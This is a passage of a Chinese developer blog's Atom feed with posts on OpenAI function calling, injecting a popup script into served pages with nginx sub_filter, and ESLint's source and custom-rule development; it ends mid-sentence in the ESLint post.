<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>不知</title>
  
  <subtitle>知之为知之，不知为不知</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jscoder.com/"/>
  <updated>2023-10-18T13:26:55.835Z</updated>
  <id>https://jscoder.com/</id>
  
  <author>
    <name>Yao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>openai Function call</title>
    <link href="https://jscoder.com/2023/10/18/front-end/function-call/"/>
    <id>https://jscoder.com/2023/10/18/front-end/function-call/</id>
    <published>2023-10-17T23:27:59.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>Function Call 是 openai 6 月份推出的一个新功能，可以把 GPT 作为输入输出，中间数据的处理生成由外部处理。</p><h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><p>Function Call 比较好理解</p><ol><li>定义函数，供 GPT 选择调用</li><li>GPT 作为输入端，提取用户的输入作为参数，调用自定义的函数</li><li>GPT 语义化输出函数的内容</li></ol><p><img src="/images/function.svg"></p><h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// openai function call example  </span><span class="token keyword">import</span> OpenAI <span class="token keyword">from</span> <span class="token string">"openai"</span><span class="token punctuation">;</span><span class="token keyword">const</span> openai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpenAI</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    apiKey<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 你的 key&amp;#125;);  </span><span class="token comment" spellcheck="true">// 被调用的函数，这里是静态数据  </span>    <span class="token keyword">function</span> <span class="token function">getCurrentWeather</span><span class="token punctuation">(</span>location<span class="token punctuation">,</span> unit <span class="token operator">=</span> <span class="token string">"fahrenheit"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> weatherInfo <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token string">"location"</span><span class="token punctuation">:</span> location<span class="token punctuation">,</span>        <span class="token string">"temperature"</span><span class="token punctuation">:</span> <span class="token string">"22"</span><span class="token punctuation">,</span>        <span class="token string">"unit"</span><span class="token punctuation">:</span> unit<span class="token punctuation">,</span>        <span class="token string">"forecast"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"sunny"</span><span class="token punctuation">,</span> <span class="token string">"windy"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>weatherInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runConversation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Step 1: 发生消息给 GPT    </span>    <span class="token keyword">const</span> messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"今天的天气怎么样?"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> functions <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 定义函数名称  </span>            <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"get_current_weather"</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// 定义函数的作用  </span>            <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"Get the current weather in a given location，没有地点，需要询问用户"</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// 描述函数接受的参数的 JSON 架构对象  </span>            <span class="token comment" spellcheck="true">// https://json-schema.org/understanding-json-schema  </span>            <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 函数参数  </span>                <span class="token string">"properties"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                    <span class="token string">"location"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                        <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                        <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"The city and state, e.g. San Francisco, CA"</span><span class="token punctuation">,</span>                    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>                    <span class="token string">"unit"</span><span class="token punctuation">:</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span> <span class="token string">"enum"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"celsius"</span><span class="token punctuation">]</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>                <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>                <span class="token comment" spellcheck="true">// 函数参数是否必传  </span>                <span class="token string">"required"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"location"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> openai<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        model<span class="token punctuation">:</span> <span class="token string">"gpt-3.5-turbo"</span><span class="token punctuation">,</span>        messages<span class="token punctuation">:</span> messages<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// 注意，这里新增了 function 参数  </span>        functions<span class="token punctuation">:</span> functions<span class="token punctuation">,</span>        function_call<span class="token punctuation">:</span> <span class="token string">"auto"</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// auto is default, but we'll be explicit  </span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> responseMessage <span class="token operator">=</span> response<span class="token punctuation">.</span>choices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>message<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Step 2: 检查返回的消息是否包含函数调用  </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>responseMessage<span class="token punctuation">.</span>function_call<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Step 3: 调用函数  </span>        <span class="token comment" spellcheck="true">// Note: the JSON response may not always be valid; be sure to handle errors  </span>        <span class="token keyword">const</span> availableFunctions <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            get_current_weather<span class="token punctuation">:</span> getCurrentWeather<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// only one function in this example, but you can have multiple  </span>        <span class="token keyword">const</span> functionName <span class="token operator">=</span> responseMessage<span class="token punctuation">.</span>function_call<span class="token punctuation">.</span>name<span class="token punctuation">;</span>        <span class="token keyword">const</span> functionToCall <span class="token operator">=</span> availableFunctions<span class="token punctuation">[</span>functionName<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> functionArgs <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>responseMessage<span class="token punctuation">.</span>function_call<span class="token punctuation">.</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> functionResponse <span class="token operator">=</span> <span class="token function">functionToCall</span><span class="token punctuation">(</span>            functionArgs<span class="token punctuation">.</span>location<span class="token punctuation">,</span>            functionArgs<span class="token punctuation">.</span>unit<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Step 4: 把函数返回结果发送给 GPT        messages.push(responseMessage);  // extend conversation with assistant's reply  </span>        messages<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"function"</span><span class="token punctuation">,</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> functionName<span class="token punctuation">,</span>            <span class="token string">"content"</span><span class="token punctuation">:</span> functionResponse<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取 GPT 的转换之后的回复。  </span>        <span class="token keyword">const</span> secondResponse <span class="token operator">=</span> <span class="token keyword">await</span> openai<span class="token punctuation">.</span>chat<span class="token punctuation">.</span>completions<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            model<span class="token punctuation">:</span> <span class="token string">"gpt-3.5-turbo"</span><span class="token punctuation">,</span>            messages<span class="token punctuation">:</span> messages<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// get a new response from GPT where it can see the function response  </span>        <span class="token keyword">return</span> secondResponse<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token function">runConversation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>functions 函数有三个主参数：name、description 和 parameters。模型使用 description 参数来确定何时以及如何调用函数，需要提供说明。<br>parameters 是描述函数接受的参数的 JSON 架构对象。可以在 JSON 架构参考 中详细了解 JSON 架构对象。</p><h1 id="对话举例："><a href="#对话举例：" class="headerlink" title="对话举例："></a>对话举例：</h1><pre><code>user - 今天天气怎么样gpt - 请给出你的城市user - 无锡gpt - (调用函数)今天天气晴</code></pre><pre><code>user - 无锡今天天气怎么样gpt - (调用函数)今天天气晴</code></pre><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>可以极大的扩展GPT的使用场景，可以相对安全的输出内容。</p><ul><li>客服场景：根据关键词触发相关的回答</li><li>搜索：根据关键词进行搜索，比如搜索语雀等知识库，输出相关内容<br>参考</li></ul><p>如何将函数调用与 Azure OpenAI 服务配合使用 - Azure OpenAI Service | Microsoft Learn<br>Function calling and other API updates</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://learn.microsoft.com/zh-cn/azure/ai-services/openai/how-to/function-calling">如何将函数调用与 Azure OpenAI 服务配合使用 - Azure OpenAI Service | Microsoft Learn</a></li><li><a href="https://openai.com/blog/function-calling-and-other-api-updates">Function calling and other API updates</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Function Call 是 openai 6 月份推出的一个新功能，可以把 GPT 作为输入输出，中间数据的处理生成由外部处理。&lt;/p&gt;
&lt;h1 id=&quot;理解&quot;&gt;&lt;a href=&quot;#理解&quot; class=&quot;headerlink&quot; title=&quot;理解&quot;&gt;&lt;/a&gt;理解&lt;/h1
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="axios" scheme="https://jscoder.com/tags/axios/"/>
    
      <category term="openai" scheme="https://jscoder.com/tags/openai/"/>
    
  </entry>
  
  <entry>
    <title>五福投放技术实现</title>
    <link href="https://jscoder.com/2023/02/26/front-end/wufu/"/>
    <id>https://jscoder.com/2023/02/26/front-end/wufu/</id>
    <published>2023-02-26T09:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>今年支付宝五福在众多小程序中都有接入，技术上接入是无感知的，本篇博客尝试去分析实现这种无感知的接入。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>小程序约等于 h5，如果我们要实现类似五福的弹框，那么必然要引入一段js，由这段 js 去实现页面的效果。<br>弹框怎么样保证在最前面，不被页面的元素层级覆盖，我们需要获取页面最大的 <code>z-index</code> 值。</p><h2 id="层级"><a href="#层级" class="headerlink" title="层级"></a>层级</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getMaxZIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">+</span>window<span class="token punctuation">.</span><span class="token function">getComputedStyle</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>zIndex <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p><code>document.body.querySelectorAll(&#39;*&#39;)</code> 获取页面所有元素，返回 NodeList 类数组，转化为一般数组之后，通过 <code>window.getComputedStyle(e).zIndex</code> 获取最大的层级，在 reduce 函数中对比下大小，返回最大的 <code>z-index</code> 层级</p><p>通过这部分，我们只需要在最大的 <code>z-index</code> 上面加1即可以保证我们的层级在最上面。</p><h2 id="如何引入-js"><a href="#如何引入-js" class="headerlink" title="如何引入 js"></a>如何引入 js</h2><p>弹框已经不成问题，那我们怎么在众多的页面中去引入这段 js 呢？还不能在单体应用维度去操作。<br>nginx或者网关。我们的 html 文件都会从 nginx 去分发，我们可以从这个口子直接去做文件内容的替换。</p><p>nginx 内置的 ngx_http_sub_module 模块可以帮助我们实现这部分功能。</p><h3 id="ngx-http-sub-module："><a href="#ngx-http-sub-module：" class="headerlink" title="ngx_http_sub_module："></a>ngx_http_sub_module：</h3><p>1）介绍：</p><p>ngx_http_sub_module模块是一个过滤器，它修改网站响应内容中的字符串。这个模块已经内置在nginx中，但是默认未安装，需要安装需要加上配置参数：–with-http_sub_module 如果已经安装nginx,只需要再添加这个模块就可以了。</p><p>2）常用指令：</p><p>2.1 sub_filter指令： sub_filter string（原字符串） replacement（用于替换的字符串）;<br>用于设置需要使用说明字符串替换说明字符串.string是要被替换的字符串，replacement是 新的字符串，它里面可以带变量。</p><p>2.2 sub_filter_last_modified指令： sub_filter_last_modified on | off;<br>用于设置网页内替换后是否修改 可在nginx.conf的 http, server, location三个位置配置使 用，默认值是off；</p><p>2.3 sub_filter_once指令：sub_filter_once on | off;<br>用于设置字符串替换次数，默认只替换一次。如果是on，默认只替换第一次匹配到的到字 符，如果是off，那么所有匹配到的字符都会被替换；</p><p>2.4 sub_filter_types指令：sub_filter_types *<br>用于指定需要被替换的MIME类型,默认为“text/html”，如果制定为*，那么所有的；</p><p>3）说明：<br>3.1以上指令可在nginx.conf的http, server, location三个位置配置使用；<br>3.2此模块替换不区分大小写；<br>3.3支持中文替换；</p><pre class=" language-bash"><code class="language-bash">location ^~/im/ <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    proxy_pass http://p.qiao.baidu.com<span class="token punctuation">;</span>    add_header Access-Control-Allow-Origin *<span class="token punctuation">;</span>    sub_filter <span class="token string">'&lt;/body>'</span> <span class="token string">'&lt;script src="example.com" />&lt;/body>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">##将响应内容中&lt;/body>替换为对应的 script 标签</span>    sub_filter_once off<span class="token punctuation">;</span><span class="token comment" spellcheck="true">####所有匹配到的都替换</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实现并不算太复杂，很像 http 时代的互联网运营商插入的小广告，也像 chrome 的插件机制。现在的实现还比较粗糙，在 nginx 层面，如果有网关，应该会更容易一点。<br>技术是一把双刃剑，想用好这把剑，要不断地修炼自己。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/kenwar/p/8296508.html">nginx替换响应内容 - kenwar - 博客园</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今年支付宝五福在众多小程序中都有接入，技术上接入是无感知的，本篇博客尝试去分析实现这种无感知的接入。&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;小程序约等于 h5，如果
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
  </entry>
  
  <entry>
    <title>ESLint 自定义规则开发</title>
    <link href="https://jscoder.com/2023/02/16/front-end/eslint-source/"/>
    <id>https://jscoder.com/2023/02/16/front-end/eslint-source/</id>
    <published>2023-02-15T22:00:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p>ESLint 是 js 代码格式化工具，能够自动发现并尝试修复代码中的问题，是团队开发的必备工具。大部分时候，使用既定规则即可，业界也有比较多的成熟配置：</p><ul><li>eslint:recommended ESLint内置的推荐规则在么有讲到 所有打钩的就是内置规则</li><li>eslint:all：ESLint 内置的所有规则；</li><li>eslint-config-standard：standard 的 JS 规范；</li><li>eslint-config-prettier：关闭和 ESLint 中以及其他扩展中有冲突的规则；</li><li>eslint-config-airbnb-base：airbab 的 JS 规范；</li><li>eslint-config-alloy：腾讯 AlloyTeam 前端团队出品，可以很好的针对你项目的技术栈进行配置选择，比如可以选 React、Vue（现已支持 Vue 3.0）、TypeScript 等；</li></ul><p>本篇并不想讨论这些规则的配置和使用，搜索引擎学习这些内容会更加容易。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><pre><code>var date = new Date(&quot;2023-02-16 06:00&quot;);</code></pre><p>上面的代码在pc上没有大问题，但是在移动端 ios 中会报错，ios 不支持 <code>2023-02-16 06:00</code> 这样的写法，需要写成 <code>2023/02/16 06:00</code> 这样的形式。</p><p>在项目管理中，团队人员多了，很难从口头成面达成一致，最好还是从 ESLint 规则上面去想办法。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/images/2023/02/16/16765026485289.jpg"></p><p>ESLint 第一个 commit 是 2013 年，2013.7.1 发布了 0.0.2 版本，后续虽然一直在更新各种功能，但是核心逻辑其实没有变化，我们看 0.0.2 版本的源码会更加轻松一点。</p><p><img src="/images/2023/02/16/16765028134191.jpg"></p><p>我们熟悉的 <code>no-console</code> 等规则在第一版已经实现。我们看一下它的具体实现</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token string">"MemberExpression"</span><span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>object<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token string">"console"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                context<span class="token punctuation">.</span><span class="token function">report</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token string">"Unexpected console statement."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><p>代码很简单，判断节点是否是 <code>console</code>,如果是，那么调用 context.report 函数去上报异常。<code>MemberExpression</code> 这个方法名称有点奇怪，可能是比较核心的内容。</p><p>我们继续梳理代码，很快就会发现这一块内容<br><img src="/images/2023/02/16/16765032551049.jpg"></p><p>逻辑非常清晰，读取配置，读取规则，对文件应用规则。<br>继续跟踪读取文件：</p><p><img src="/images/2023/02/16/16765033790035.jpg"></p><p>jscheck 是一个类，上面挂载了一些方法，verify 似乎是干活的主要部分：<br><img src="/images/2023/02/16/16765034874120.jpg"></p><p>部分配置项被我收起，不影响我们核心理解，这里出现了两个 npm 包：</p><ul><li><a href="https://github.com/jquery/esprima">esprima</a></li><li><a href="https://www.npmjs.com/package/astw">astw</a></li></ul><h3 id="esprima"><a href="#esprima" class="headerlink" title="esprima"></a>esprima</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> esprima <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'esprima'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> program <span class="token operator">=</span> <span class="token string">'const answer = 42'</span><span class="token punctuation">;</span><span class="token keyword">var</span> program2 <span class="token operator">=</span> <span class="token string">'console.log(123)'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>esprima<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>program<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>esprima<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>program2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>输出：</p><pre class=" language-json"><code class="language-json">&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>      <span class="token property">"declarations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        &amp;#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>          <span class="token property">"id"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"answer"</span>          &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>          <span class="token property">"init"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token property">"value"</span><span class="token operator">:</span> <span class="token number">42</span><span class="token punctuation">,</span>            <span class="token property">"raw"</span><span class="token operator">:</span> <span class="token string">"42"</span>          &amp;#<span class="token number">125</span><span class="token punctuation">;</span>        &amp;#<span class="token number">125</span><span class="token punctuation">;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"const"</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"script"</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span>&amp;#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    &amp;#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"ExpressionStatement"</span><span class="token punctuation">,</span>      <span class="token property">"expression"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"CallExpression"</span><span class="token punctuation">,</span>        <span class="token property">"callee"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"MemberExpression"</span><span class="token punctuation">,</span>          <span class="token property">"computed"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>          <span class="token property">"object"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"console"</span>          &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>          <span class="token property">"property"</span><span class="token operator">:</span> &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"log"</span>          &amp;#<span class="token number">125</span><span class="token punctuation">;</span>        &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>        <span class="token property">"arguments"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          &amp;#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token property">"value"</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">,</span>            <span class="token property">"raw"</span><span class="token operator">:</span> <span class="token string">"123"</span>          &amp;#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token punctuation">]</span>      &amp;#<span class="token number">125</span><span class="token punctuation">;</span>    &amp;#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"script"</span>&amp;#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>我们前面遇到的 <code>MemberExpression</code> 在这里再次出现，成员表达式节点，即表示引用对象成员的语句。这里是把 js 转换成抽象语法树，后续根据语法树去判读是否和规则匹配。</p><p>常见的 AST 